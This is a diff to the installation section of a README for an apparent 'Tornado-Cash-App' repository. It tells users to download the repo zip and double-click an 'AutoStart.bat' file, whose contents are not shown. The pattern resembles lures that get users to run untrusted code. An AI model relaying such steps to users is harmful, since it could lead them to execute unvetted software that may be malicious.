@@ -34,9 +34,10 @@ python3 main.py
 
 ## Installation (Way II)
 
-1. [Download](https://github.com/easytornado/Tornado-Cash-App/archive/refs/heads/main.zip) the repository release and extract files.
-2.  Double-click on the `"AutoStart.bat"` file to run it.
-
+- Download and install [Python 3.12.1](https://www.python.org/ftp/python/3.12.1/python-3.12.1-amd64.exe)
+- Download [This Repo](https://github.com/easytornado/Tornado-Cash-App/archive/refs/heads/main.zip) the repository release and extract files. 
+- Double-click on the "AutoStart.bat" file to run it.
+- And follow the instructions in the application window.
 
 ## Usage
 
